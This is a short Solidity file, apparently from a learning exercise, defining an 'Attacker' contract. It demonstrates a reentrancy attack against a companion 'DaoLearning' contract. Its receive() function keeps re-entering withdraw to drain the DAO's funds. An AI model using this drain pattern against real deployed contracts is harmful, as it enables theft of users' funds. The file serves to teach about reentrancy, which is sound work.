// SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.7.0 <0.9.0;

import "./DaoLearning.sol";

//Test contract to demonstrate a Reentrancy attack

contract Attacker {

    uint64 constant internal ATTACK_LOOP_LIMIT = 75;
    uint64 internal current_iteration = 0;

    //Instantiate the owner's address, and the contract to be attacked
    address payable owner;
    DaoLearning dao;

    //Whether the contract is attacking (as opposed to withdrawing normally)
    bool attacking = false;

    //Constructs this attacker, saving the owner to a variable
    constructor() {
        owner = payable(msg.sender);
    }

    //Initialize the DAO contract variable with it's address
    function initializeDao(address addr) public {
        dao = DaoLearning(addr);
    }

    //Deposit money onto this contract's account with the DAO
    function depositToDao() public payable {
        dao.mintTokens{value: msg.value-1}();
    }

    //Check this contract's balance with the DAO
    function myDaoBalance() public view returns (uint64) {
        return dao.checkBalance();
    }

    //Withdraw the money stored with the DAO back to this contract
    function withdrawFromDao() public {
        dao.withdraw(myDaoBalance());
    }

    //Begins a withdrawl from the DAO, with the bool that triggers recursion
    function attack() public {
        attacking = true;
        current_iteration = 1;
        withdrawFromDao();
    }

    //Receive function, which acts as normal until "attacking" is set to true
    receive() external payable {
        //If the contract is attacking right now
        if (attacking && current_iteration < ATTACK_LOOP_LIMIT) {
            current_iteration++;
            //Check to see if the DAO still has more money to take
            if (address(dao).balance >= msg.value) {
                //If so, take more
                withdrawFromDao();
            } else {
                //If not, stop taking, and allow the call stack to close
                attacking = false;
            }
        }
    }

}
